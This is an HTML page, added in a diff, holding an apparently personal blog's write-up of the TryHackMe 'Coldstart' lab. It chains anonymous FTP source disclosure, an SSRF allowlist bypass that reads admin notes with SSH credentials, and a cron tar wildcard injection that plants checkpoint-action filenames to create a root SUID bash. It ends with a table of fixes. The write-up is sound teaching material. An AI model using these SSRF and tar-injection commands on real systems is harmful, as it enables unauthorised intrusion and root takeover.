@@ -1,0 +1,724 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Coldstart — TryHackMe Writeup — CyberMaks</title>
+  <meta name="description" content="Coldstart TryHackMe writeup — Anonymous FTP leaks source code, SSRF bypasses hostname allowlist to read internal admin notes, wildcard injection in cron escalates to root." />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=DM+Mono:ital,wght@0,300;0,400;0,500;1,300&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg:       #0b0f14;
+      --bg-2:     #0f1419;
+      --bg-3:     #141b22;
+      --bg-code:  #0d1117;
+      --border:   #1e2730;
+      --border-2: #253040;
+      --text:     #c8d0da;
+      --text-dim: #6b7a8d;
+      --text-faint: #3a4552;
+      --accent:   #4d9de0;
+      --accent-dim: #2d6fa8;
+      --green:    #34c759;
+      --yellow:   #ff9f0a;
+      --red:      #ff453a;
+      --mono: 'DM Mono', monospace;
+      --sans: 'DM Sans', sans-serif;
+    }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--sans);
+      font-size: 15px;
+      line-height: 1.7;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    nav {
+      position: fixed;
+      top: 0; left: 0; right: 0;
+      z-index: 100;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 2rem;
+      height: 56px;
+      background: rgba(11,15,20,0.85);
+      backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--border);
+    }
+    .nav-brand {
+      font-family: var(--mono);
+      font-size: 13px;
+      color: var(--accent);
+      text-decoration: none;
+      letter-spacing: 0.04em;
+    }
+    .nav-links {
+      display: flex;
+      gap: 2rem;
+      list-style: none;
+    }
+    .nav-links a {
+      font-size: 13px;
+      color: var(--text-dim);
+      text-decoration: none;
+      letter-spacing: 0.02em;
+      transition: color 0.15s;
+    }
+    .nav-links a:hover { color: var(--text); }
+
+    .page-wrap {
+      max-width: 780px;
+      margin: 0 auto;
+      padding: 100px 2rem 80px;
+    }
+
+    .back-link {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--text-dim);
+      text-decoration: none;
+      margin-bottom: 2.5rem;
+      letter-spacing: 0.03em;
+      transition: color 0.15s;
+    }
+    .back-link:hover { color: var(--accent); }
+    .back-link svg { width: 14px; height: 14px; }
+
+    .post-header { margin-bottom: 2.5rem; }
+
+    .post-meta {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 1rem;
+      flex-wrap: wrap;
+    }
+    .badge {
+      font-family: var(--mono);
+      font-size: 11px;
+      letter-spacing: 0.06em;
+      padding: 3px 9px;
+      border-radius: 3px;
+      text-transform: uppercase;
+    }
+    .badge-platform { background: rgba(77,157,224,0.1); color: var(--accent); border: 1px solid rgba(77,157,224,0.2); }
+    .badge-medium   { background: rgba(255,159,10,0.1);  color: var(--yellow); border: 1px solid rgba(255,159,10,0.2); }
+    .badge-easy     { background: rgba(52,199,89,0.08);  color: #34c759;       border: 1px solid rgba(52,199,89,0.2); }
+    .badge-tag      { background: rgba(255,255,255,0.04); color: var(--text-dim); border: 1px solid var(--border); }
+
+    .post-title {
+      font-family: var(--sans);
+      font-size: 28px;
+      font-weight: 600;
+      color: #e8edf3;
+      line-height: 1.25;
+      letter-spacing: -0.3px;
+      margin-bottom: 0.75rem;
+    }
+    .post-date {
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--text-faint);
+      letter-spacing: 0.04em;
+    }
+
+    .divider {
+      height: 1px;
+      background: var(--border);
+      margin: 2rem 0;
+    }
+
+    .chain-block {
+      background: var(--bg-2);
+      border: 1px solid var(--border);
+      border-left: 2px solid var(--accent);
+      border-radius: 6px;
+      padding: 1.25rem 1.5rem;
+      margin-bottom: 2.5rem;
+    }
+    .chain-block h3 {
+      font-family: var(--mono);
+      font-size: 11px;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      color: var(--text-dim);
+      margin-bottom: 1rem;
+    }
+    .chain-step {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      margin-bottom: 8px;
+    }
+    .chain-step:last-child { margin-bottom: 0; }
+    .chain-arrow {
+      font-family: var(--mono);
+      color: var(--accent-dim);
+      font-size: 12px;
+      padding-top: 1px;
+      flex-shrink: 0;
+    }
+    .chain-text {
+      font-family: var(--mono);
+      font-size: 13px;
+      color: var(--text);
+      line-height: 1.5;
+    }
+
+    .section { margin-bottom: 2.5rem; }
+    .section-num {
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--accent);
+      letter-spacing: 0.08em;
+      margin-bottom: 4px;
+    }
+    h2 {
+      font-size: 18px;
+      font-weight: 600;
+      color: #e8edf3;
+      letter-spacing: -0.2px;
+      margin-bottom: 1rem;
+    }
+    p { color: var(--text); margin-bottom: 0.85rem; }
+    p:last-child { margin-bottom: 0; }
+
+    .callout {
+      background: rgba(77,157,224,0.06);
+      border: 1px solid rgba(77,157,224,0.15);
+      border-left: 2px solid var(--accent);
+      border-radius: 4px;
+      padding: 0.85rem 1.1rem;
+      font-size: 13.5px;
+      color: var(--text);
+      margin: 1rem 0;
+    }
+    .callout.warn {
+      background: rgba(255,159,10,0.06);
+      border-color: rgba(255,159,10,0.15);
+      border-left-color: var(--yellow);
+    }
+    .callout.tip {
+      background: rgba(52,199,89,0.06);
+      border-color: rgba(52,199,89,0.15);
+      border-left-color: var(--green);
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 1rem 0;
+      font-size: 13.5px;
+    }
+    thead tr { border-bottom: 1px solid var(--border-2); }
+    th {
+      font-family: var(--mono);
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 0.07em;
+      color: var(--text-dim);
+      text-align: left;
+      padding: 8px 12px 8px 0;
+      font-weight: 400;
+    }
+    td {
+      padding: 8px 12px 8px 0;
+      color: var(--text);
+      border-bottom: 1px solid var(--border);
+      font-family: var(--mono);
+      font-size: 13px;
+    }
+    tbody tr:last-child td { border-bottom: none; }
+    td:first-child { color: var(--accent); }
+
+    .code-block { position: relative; margin: 1rem 0; }
+    .code-label {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: var(--bg-3);
+      border: 1px solid var(--border);
+      border-bottom: none;
+      border-radius: 5px 5px 0 0;
+      padding: 6px 12px;
+    }
+    .code-lang {
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--text-faint);
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+    }
+    .copy-btn {
+      font-family: var(--mono);
+      font-size: 10px;
+      color: var(--text-dim);
+      background: none;
+      border: none;
+      cursor: pointer;
+      letter-spacing: 0.04em;
+      transition: color 0.15s;
+      padding: 2px 4px;
+    }
+    .copy-btn:hover { color: var(--accent); }
+    pre {
+      background: var(--bg-code);
+      border: 1px solid var(--border);
+      border-radius: 0 0 5px 5px;
+      padding: 1rem 1.1rem;
+      overflow-x: auto;
+      font-family: var(--mono);
+      font-size: 13px;
+      line-height: 1.65;
+      color: var(--text);
+    }
+    code {
+      font-family: var(--mono);
+      font-size: 12.5px;
+      background: rgba(255,255,255,0.05);
+      border: 1px solid var(--border);
+      padding: 1px 5px;
+      border-radius: 3px;
+      color: var(--text);
+    }
+
+    .cm { color: var(--text-faint); }
+    .kw { color: var(--accent); }
+    .st { color: #a8d8a8; }
+    .nu { color: var(--yellow); }
+    .fn { color: #e0c9f5; }
+    .rd { color: var(--red); }
+
+    .creds-table td:first-child { color: var(--text-dim); }
+    .creds-table td:nth-child(2) { color: var(--red); }
+    .creds-table td:nth-child(3) { color: var(--text-dim); font-size: 12px; }
+
+    .takeaway {
+      display: flex;
+      gap: 12px;
+      align-items: flex-start;
+      margin-bottom: 0.75rem;
+    }
+    .takeaway:last-child { margin-bottom: 0; }
+    .takeaway-dot {
+      width: 5px;
+      height: 5px;
+      border-radius: 50%;
+      background: var(--accent);
+      flex-shrink: 0;
+      margin-top: 8px;
+    }
+    .takeaway-text { font-size: 14px; color: var(--text); }
+
+    .room-ref {
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--text-faint);
+      text-decoration: none;
+      letter-spacing: 0.03em;
+      display: inline-block;
+      margin-top: 6px;
+      transition: color 0.15s;
+    }
+    .room-ref:hover { color: var(--accent); }
+
+    .ref-link {
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--accent-dim);
+      text-decoration: none;
+      letter-spacing: 0.02em;
+      transition: color 0.15s;
+    }
+    .ref-link:hover { color: var(--accent); }
+
+    .vuln-table td:first-child  { color: var(--accent); }
+    .vuln-table td:nth-child(2) { color: var(--text-dim); font-size: 12.5px; }
+    .vuln-table td:nth-child(3) { color: var(--text-faint); font-size: 12px; }
+
+    footer {
+      border-top: 1px solid var(--border);
+      margin-top: 4rem;
+      padding-top: 2rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .footer-brand {
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--text-faint);
+    }
+    .footer-links { display: flex; gap: 1.5rem; }
+    .footer-links a {
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--text-faint);
+      text-decoration: none;
+      transition: color 0.15s;
+    }
+    .footer-links a:hover { color: var(--accent); }
+
+    @media (max-width: 600px) {
+      .nav-links { display: none; }
+      .post-title { font-size: 22px; }
+      footer { flex-direction: column; gap: 1rem; }
+    }
+  </style>
+</head>
+<body>
+
+<nav>
+  <a class="nav-brand" href="/">CyberMaks</a>
+  <ul class="nav-links">
+    <li><a href="/#cases">Case Studies</a></li>
+    <li><a href="/methodology.html">Methodology</a></li>
+    <li><a href="/about.html">About</a></li>
+    <li><a href="/contact.html">Contact</a></li>
+  </ul>
+</nav>
+
+<div class="page-wrap">
+
+  <a class="back-link" href="/">
+    <svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M10 3L5 8l5 5"/>
+    </svg>
+    Case Studies
+  </a>
+
+  <header class="post-header">
+    <div class="post-meta">
+      <span class="badge badge-platform">TryHackMe</span>
+      <span class="badge badge-easy">Easy</span>
+      <span class="badge badge-tag">ssrf</span>
+      <span class="badge badge-tag">ftp-anon</span>
+      <span class="badge badge-tag">wildcard-injection</span>
+      <span class="badge badge-tag">cron-abuse</span>
+    </div>
+    <h1 class="post-title">Coldstart</h1>
+    <div class="post-date">2026-05-26</div>
+    <a class="room-ref" href="https://tryhackme.com/room/operationcoldstart" target="_blank" rel="noopener">tryhackme.com/room/operationcoldstart ↗</a>
+  </header>
+
+  <div class="chain-block">
+    <h3>Attack Chain</h3>
+    <div class="chain-step"><span class="chain-arrow">01</span><span class="chain-text">Anonymous FTP → backup.tar.gz → Flask source code disclosure</span></div>
+    <div class="chain-step"><span class="chain-arrow">02</span><span class="chain-text">Source analysis → SSRF via hostname-only allowlist bypass</span></div>
+    <div class="chain-step"><span class="chain-arrow">03</span><span class="chain-text">SSRF → /admin/notes → SSH credentials in plaintext</span></div>
+    <div class="chain-step"><span class="chain-arrow">04</span><span class="chain-text">SSH as webdev → user flag</span></div>
+    <div class="chain-step"><span class="chain-arrow">05</span><span class="chain-text">Cron wildcard injection → tar checkpoint exec → SUID bash → root</span></div>
+  </div>
+
+  <div class="divider"></div>
+
+  <!-- SECTION 1 -->
+  <div class="section">
+    <div class="section-num">01 — Recon</div>
+    <h2>Nmap</h2>
+    <p>Quick stealth scan. Three ports, no mystery — the machine is practically waving at you.</p>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>sudo nmap -sS -sV -sC 10.49.137.6 -F -T4</pre>
+    </div>
+    <table>
+      <thead><tr><th>Port</th><th>Service</th><th>Note</th></tr></thead>
+      <tbody>
+        <tr><td>21</td><td>vsftpd 3.0.5</td><td>Anonymous login allowed</td></tr>
+        <tr><td>22</td><td>OpenSSH 9.6p1</td><td>Ubuntu</td></tr>
+        <tr><td>80</td><td>Gunicorn / Python</td><td>URL Preview — Volt Labs</td></tr>
+      </tbody>
+    </table>
+    <p>Two things immediately stand out: anonymous FTP (never a good sign for the defenders) and a "URL Preview Service" — which is hacker for <em>please SSRF me</em>. FTP first.</p>
+  </div>
+
+  <!-- SECTION 2 -->
+  <div class="section">
+    <div class="section-num">02 — Anonymous FTP</div>
+    <h2>Source Code Disclosure</h2>
+    <p>Anonymous login, one directory, one file. Someone staged a backup to FTP and apparently forgot what FTP means.</p>
+
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>ftp 10.49.137.6
+<span class="cm"># Name: ftp — no password needed</span>
+
+ftp> cd pub
+ftp> get backup.tar.gz
+ftp> bye</pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>tar xzf backup.tar.gz
+ls
+
+<span class="st">app.py</span>   <span class="cm"># Flask source — the whole application, handed to us</span></pre>
+    </div>
+
+    <div class="callout tip">White-box from the very first step. Reading source before touching the app is always worth it — you skip the guessing entirely and go straight to the vulnerability.</div>
+  </div>
+
+  <!-- SECTION 3 -->
+  <div class="section">
+    <div class="section-num">03 — Source Analysis</div>
+    <h2>SSRF via Hostname-Only Allowlist</h2>
+    <p>The app is a URL preview service. It takes a URL, fetches it with <code>requests.get()</code>, and returns the body. There's an allowlist, but it only checks the hostname — not the scheme, not the path, and definitely not whether the resolved IP is localhost.</p>
+
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">python — app.py (vulnerable excerpt)</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>ALLOWED_HOSTS = {<span class="st">"kestrel.thm"</span>}
+
+<span class="cm"># Only the hostname is validated. Scheme, path, and resolved IP — ignored.</span>
+host = (urlparse(target).hostname <span class="kw">or</span> <span class="st">""</span>).lower()
+<span class="kw">if</span> host <span class="kw">not in</span> ALLOWED_HOSTS:
+    abort(<span class="nu">403</span>)
+
+r = requests.<span class="fn">get</span>(target, timeout=<span class="nu">3</span>)   <span class="cm"># fetch runs as-is</span></pre>
+    </div>
+
+    <p>The <code>/admin/</code> route is protected by a <code>remote_addr</code> check — only loopback addresses can reach it:</p>
+
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">python — admin route</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>@app.route(<span class="st">"/admin/&lt;path:p&gt;"</span>)
+<span class="kw">def</span> <span class="fn">admin</span>(p=<span class="st">"index"</span>):
+    <span class="kw">if not</span> request.remote_addr.<span class="fn">startswith</span>(<span class="st">"127."</span>):
+        abort(<span class="nu">403</span>)                              <span class="cm"># blocks external requests</span>
+    <span class="kw">if</span> p == <span class="st">"notes"</span>:
+        <span class="kw">with</span> <span class="fn">open</span>(<span class="st">"/opt/voltlabs-preview/admin_notes.txt"</span>) <span class="kw">as</span> f:
+            <span class="kw">return</span> <span class="st">"&lt;pre&gt;"</span> + f.<span class="fn">read</span>() + <span class="st">"&lt;/pre&gt;"</span></pre>
+    </div>
+
+    <div class="callout warn">The comment in the source literally reads: <em>"the SSRF is still abusable, but only against the allowed hostname."</em> The developer knew. They just decided that was fine. It was not fine.</div>
+
+    <p>The fix was supposed to be the allowlist. But since <code>kestrel.thm</code> resolves to <code>127.0.0.1</code> via <code>/etc/hosts</code>, passing it directly routes the request through loopback — and the admin check sees <code>127.0.0.1</code> as the caller.</p>
+  </div>
+
+  <!-- SECTION 4 -->
+  <div class="section">
+    <div class="section-num">04 — Exploitation</div>
+    <h2>SSRF → Admin Notes → SSH Credentials</h2>
+
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>curl "http://10.49.137.6/preview?url=http://kestrel.thm/admin/notes"</pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">output — admin_notes.txt</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>=== INTERNAL ===
+SSH access for staging:
+  user: <span class="st">webdev</span>
+  pass: <span class="st">V0ltLabs#******</span>
+  - Mara</pre>
+    </div>
+
+    <p>Mara left SSH credentials in an internal admin notes file, behind a localhost-only route, on a server with an SSRF vulnerability. Mara had a rough day.</p>
+
+    <div class="callout tip">The <code>/admin/notes</code> path was visible in the source. Source code disclosure didn't just give us the vulnerability — it gave us the exact endpoint to hit.</div>
+
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>ssh webdev@10.49.137.6
+<span class="cm"># password from admin notes</span></pre>
+    </div>
+
+    <p>Logged in as <code>webdev</code>. User flag at the usual spot.</p>
+  </div>
+
+  <!-- SECTION 5 -->
+  <div class="section">
+    <div class="section-num">05 — Privilege Escalation</div>
+    <h2>Cron Wildcard Injection → root</h2>
+    <p>Standard post-exploitation checklist. SUID binaries were clean — nothing unusual outside the snap packages. The interesting find came from cron:</p>
+
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>cat /etc/cron.d/voltlabs-backup</pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">output</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre><span class="cm"># Volt Labs staging backup - runs as root</span>
+* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz <span class="rd">*</span>
+<span class="cm">#                                                                   ↑ unquoted wildcard, writable dir, runs as root</span></pre>
+    </div>
+
+    <p>Two preconditions align here. The cron job uses an unquoted <code>*</code> in <code>/opt/backups</code>. And <code>webdev</code> has write access to that directory. Both are required — a wildcard in a root-owned, write-protected directory is inert. Together they hand you root.</p>
+
+    <div class="callout warn">
+      <strong>Why this works — the shell expansion chain:</strong><br><br>
+      cron passes the command through <code>sh -c "..."</code>. The shell performs glob expansion on <code>*</code> <em>before forking tar</em> — every filename present in <code>/opt/backups</code> becomes a positional argument in the <code>tar</code> invocation. <code>tar</code> cannot distinguish <code>--checkpoint=1</code> typed on the command line from a file named <code>--checkpoint=1</code> that arrived via glob expansion. Both look identical once the shell is done.
+    </div>
+
+    <p>After expansion, the effective command tar receives looks like this:</p>
+
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash — effective invocation after glob expansion</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>tar czf /var/backups/uploads.tgz \
+    <span class="rd">--checkpoint=1</span> \
+    <span class="rd">--checkpoint-action=exec=sh shell.sh</span> \
+    shell.sh \
+    [... rest of files in the directory ...]</pre>
+    </div>
+
+    <p>GNU tar's checkpoint mechanism fires a user-defined action every N records processed. <code>--checkpoint=1</code> triggers after each single file; <code>--checkpoint-action=exec=sh shell.sh</code> executes the script under the same UID as <code>tar</code> — which is root. The archive doesn't need to complete successfully for the payload to run. Cron ticks every minute, so the maximum wait is 60 seconds.</p>
+
+    <p><a class="ref-link" href="https://hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html#tar" target="_blank" rel="noopener">HackTricks: Wildcard Spare Tricks — tar ↗</a></p>
+
+    <p>Confirm write access, then plant the payload:</p>
+
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>ls -la /opt/backups
+<span class="cm"># drwxrwxr-x  root webdev — writable. Perfect.</span>
+
+cd /opt/backups
+
+<span class="cm"># payload: copy bash, set SUID bit</span>
+echo <span class="st">'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'</span> > shell.sh
+
+<span class="cm"># filenames that become tar flags after shell expansion</span>
+touch -- <span class="st">"--checkpoint=1"</span>
+touch -- <span class="st">"--checkpoint-action=exec=sh shell.sh"</span></pre>
+    </div>
+
+    <p>Wait for the next cron tick. Tar runs as root, shell expands the wildcard, the checkpoint flags inject, <code>shell.sh</code> executes as root.</p>
+
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash — after one minute</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>ls -la /tmp/rootbash
+<span class="cm"># -rwsr-sr-x 1 root root — SUID set, owned by root</span>
+
+/tmp/rootbash -p
+<span class="cm"># -p preserves the effective UID — runs as root</span>
+
+whoami
+<span class="st">root</span></pre>
+    </div>
+
+    <p>One unquoted asterisk. That's all it took.</p>
+  </div>
+
+  <div class="divider"></div>
+
+  <!-- CREDS SUMMARY -->
+  <div class="section">
+    <div class="section-num">Summary</div>
+    <h2>Credentials</h2>
+    <table class="creds-table">
+      <thead><tr><th>User</th><th>Password / Method</th><th>Source</th></tr></thead>
+      <tbody>
+        <tr><td>webdev (SSH)</td><td>V0ltLabs#******</td><td>SSRF → /admin/notes</td></tr>
+        <tr><td>root</td><td>wildcard injection</td><td>cron tar + SUID bash</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <!-- FAILURE ANALYSIS -->
+  <div class="section">
+    <div class="section-num">// failure analysis</div>
+    <h2>What Broke and Why</h2>
+    <table class="vuln-table">
+      <thead>
+        <tr><th>Vector</th><th>Root Cause</th><th>Fix</th></tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>Anon FTP + source backup</td>
+          <td>Application source staged on unauthenticated service — developer treated FTP as a private channel</td>
+          <td>Disable anonymous FTP entirely; secrets and source code never belong on a public file share</td>
+        </tr>
+        <tr>
+          <td>SSRF hostname-only allowlist</td>
+          <td><code>kestrel.thm</code> resolves to <code>127.0.0.1</code> via <code>/etc/hosts</code>; scheme and resolved IP were never validated</td>
+          <td>Resolve the hostname to an IP at allowlist-check time and reject RFC1918 ranges; validate scheme explicitly</td>
+        </tr>
+        <tr>
+          <td>Credentials in admin_notes.txt</td>
+          <td>SSH credentials stored in a plaintext file inside the application tree, one hop from an SSRF sink</td>
+          <td>Secrets manager; if a note must exist, it lives outside the web root with no code path reading it</td>
+        </tr>
+        <tr>
+          <td>Cron wildcard injection</td>
+          <td>Unquoted <code>*</code> in root-run <code>tar</code> command; target directory writable by unprivileged user</td>
+          <td><code>tar czf backup.tgz -C /opt/backups .</code> — a dot cannot be shell-expanded into flags; or remove webdev write access</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <footer>
+    <span class="footer-brand">cybermaksx.com</span>
+    <div class="footer-links">
+      <a href="https://github.com/cybermaksx" target="_blank">GitHub</a>
+      <a href="https://linkedin.com" target="_blank">LinkedIn</a>
+    </div>
+  </footer>
+
+</div>
+
+<script>
+  function copyCode(btn) {
+    const pre = btn.closest('.code-block').querySelector('pre');
+    navigator.clipboard.writeText(pre.innerText).then(() => {
+      btn.textContent = 'copied';
+      setTimeout(() => btn.textContent = 'copy', 1500);
+    });
+  }
+</script>
+
+</body>
+</html>
